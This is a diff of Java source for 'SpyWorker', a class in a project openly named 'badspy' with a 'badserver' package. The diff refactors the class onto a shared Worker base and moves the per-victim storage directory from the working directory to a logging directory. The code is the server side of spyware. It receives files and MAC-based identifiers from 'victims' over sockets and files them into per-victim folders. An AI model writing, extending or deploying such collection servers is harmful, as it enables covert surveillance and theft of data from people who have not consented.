@@ -1,14 +1,12 @@
-package com.blogspot.sontx.badspy.badserver.bo.worker;
+package com.blogspot.sontx.badspy.badserver.bo.spyworker;
 
 import com.blogspot.sontx.badspy.badserver.Config;
 import com.blogspot.sontx.badspy.badserver.bean.SpyDataHeader;
 import com.blogspot.sontx.badspy.badserver.bo.SpyDscFile;
-import com.blogspot.sontx.badspy.badserver.bo.SpyReader;
-import com.blogspot.sontx.badspy.badserver.bo.SpyWriter;
+import com.blogspot.sontx.badspy.badserver.bo.Worker;
 import com.blogspot.sontx.jini.INIBadFormatException;
 import com.blogspot.sontx.jlog.Log;
 
-import java.io.Closeable;
 import java.io.File;
 import java.io.IOException;
 import java.net.Socket;
@@ -17,39 +15,16 @@ import java.net.Socket;
  * Copyright 2016 by sontx
  * Created by xuans on 20/4/2016.
  */
-public class SpyWorker extends Thread implements Closeable {
-    private Socket socket;
-    private SpyReader reader;
-    private SpyWriter writer;
+public class SpyWorker extends Worker {
     private File victimDir = null;
     private SpyDscFile dscFile = null;
-    private OnCompletedListener mOnCompletedListener = null;
-
-    public void setOnCompletedListener(OnCompletedListener listener) {
-        mOnCompletedListener = listener;
-    }
 
     public SpyWorker(Socket socket) throws IOException {
-        this.socket = socket;
-        this.reader = new SpyReader(socket.getInputStream());
-        this.writer = new SpyWriter(socket.getOutputStream());
+        super(socket);
     }
 
     @Override
-    public void run() {
-        SpyDataHeader header = null;
-        try {
-            while ((header = reader.readHeader()) != null) {
-                processHeader(header);
-            }
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-        if (mOnCompletedListener != null)
-            mOnCompletedListener.onCompleted(this);
-    }
-
-    private void processHeader(SpyDataHeader header) throws IOException {
+    protected void processHeader(SpyDataHeader header) throws IOException {
         switch (header.getContentType()) {
             case SpyDataHeader.HEADER_FILE:
                 receiveFile(header.getContentLength());
@@ -102,7 +77,7 @@ public class SpyWorker extends Thread implements Closeable {
         SpyMACReceiver receiver = new SpyMACReceiver(reader, writer, contentLength);
         receiver.start();
         if (receiver.getVictimDir() != null)
-            this.victimDir = new File(Config.WORKING_DIR, receiver.getVictimDir());
+            this.victimDir = new File(Config.LOGGING_DIR, receiver.getVictimDir());
     }
 
     private void receiveFile(int contentLength) throws IOException {
@@ -118,14 +93,5 @@ public class SpyWorker extends Thread implements Closeable {
         } finally {
             receiver.close();
         }
-    }
-
-    @Override
-    public void close() throws IOException {
-        socket.close();
-    }
-
-    public interface OnCompletedListener {
-        void onCompleted(SpyWorker worker);
     }
 }
